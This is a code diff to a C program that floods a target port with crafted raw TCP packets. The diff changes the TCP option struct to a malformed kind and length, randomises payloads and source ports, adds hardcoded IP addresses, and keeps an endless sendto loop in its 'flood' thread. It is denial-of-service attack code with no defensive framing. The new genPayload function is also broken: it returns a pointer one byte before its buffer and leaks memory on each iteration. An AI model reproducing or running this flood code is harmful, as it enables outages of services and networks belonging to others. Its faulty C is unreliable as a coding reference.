@@ -26,9 +26,9 @@ volatile unsigned int sleeptime = 100;
 static const char PAYLOAD[] = "\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x5e\x7e\xb0\x53\x47\x0a\x7e\xb0\x53";
 struct tcpopts
 {
-    uint8_t type;
+    uint8_t kind;
     uint8_t length;
-    uint8_t arbitrary;
+    uint8_t data[6];
 };
 void init_rand(unsigned long int x)
 {
@@ -146,7 +146,7 @@ void setup_ip_header(struct iphdr *iph)
     iph->saddr = inet_addr("0.0.0.0");
 }
 
-void setup_tcp_header(struct tcphdr *tcph)
+void setup_tcp_header(struct tcphdr *tcph, struct tcpopts *opts)
 {
     tcph->source = htons(5678);
     tcph->check = 0;
@@ -157,29 +157,38 @@ void setup_tcp_header(struct tcphdr *tcph)
     tcph->urg_ptr = 0;
     tcph->window = htons(64240);
     tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpopts)) / 4;
-    memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), PAYLOAD, sizeof(PAYLOAD) - 1);
+    memcpy((void *)tcph + sizeof(struct tcphdr), opts, sizeof(struct tcpopts));
 }
 
-char *genPayload(char oldPayload[], size_t size)
+char *genPayload(int size)
 {
-    for (int i = 0; i < randnum(16, size); i++)
+    char *newPayload = (char *)malloc(size * sizeof(char));
+    for (int i = 0; i < size; i++)
     {
-        for (size_t num = 0; num < size / 2; num++)
+        if (i % 2 == 0)
         {
-            oldPayload[num] = randnum(1, size);
-            oldPayload[i] = rand_cmwc() % oldPayload[num];
+            for (size_t num = 0; num < (i / 2); num++)
+            {
+                newPayload[num] = randnum(1, size);
+                newPayload[i] = rand_cmwc() % (256 + num);
+            }
+        }
+        else
+        {
+            newPayload[i] = randnum(1, size);
         }
     }
 
-    // printf("Payload: %s\n", oldPayload);
-    return oldPayload;
+    // printf("Payload: %s\n", newPayload);
+    return newPayload - 1;
 }
 void setupTcpOpts(struct tcpopts *opts)
 {
-    opts->type = 2;
-    opts->length = 4;
-    opts->arbitrary = randnum(1, 255);
+    opts->kind = 0x70;
+    opts->length = 0x80;
+    opts->data[randnum(0, sizeof(opts->data))] = 0x01;
 }
+
 void *flood(void *par1)
 {
     char *td = (char *)par1;
@@ -200,8 +209,8 @@ void *flood(void *par1)
 
     memset(datagram, 0, MAX_PACKET_SIZE);
     setup_ip_header(iph);
-    setup_tcp_header(tcph);
     setupTcpOpts(opts);
+    setup_tcp_header(tcph, opts);
     tcph->dest = htons(floodport);
     iph->daddr = sin.sin_addr.s_addr;
     iph->check = csum((unsigned short *)datagram, iph->tot_len);
@@ -217,6 +226,9 @@ void *flood(void *par1)
         2890377736,
         2890340610,
         2890316643,
+        2890377736,
+        2890340610,
+        2890314502,
         1746755592};
 
     init_rand(time(NULL));
@@ -225,15 +237,10 @@ void *flood(void *par1)
     while (1)
     {
 
-        int randomPayloadLength = randnum(32, 512) - 1;
-        char randomPayload[randomPayloadLength];
-
-        for (int i = 0; i < randomPayloadLength; i++)
-        {
-            randomPayload[i] = rand_cmwc() % 256; // Do not change that bruh
-        }
-        memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength);
-        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomPayloadLength;
+        int randomPayloadLength = randnum(32, 512);
+        char *randomPayload = genPayload(randomPayloadLength);
+        memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
+        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + randomPayloadLength - 1;
         iph->check = csum((unsigned short *)datagram, iph->tot_len);
         tcph->check = 0;
         tcph->urg_ptr = htons(rand_cmwc() & 0xFFFF);
@@ -245,7 +252,7 @@ void *flood(void *par1)
         iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
         tcph->source = htons(rand_cmwc() & 0xFFFF);
         tcph->dest = htons(floodport);
-        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts) + randomPayloadLength);
+        tcph->check = tcpcsum(iph, tcph, randomPayloadLength - 1 + sizeof(struct tcpopts));
 
         if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
         {
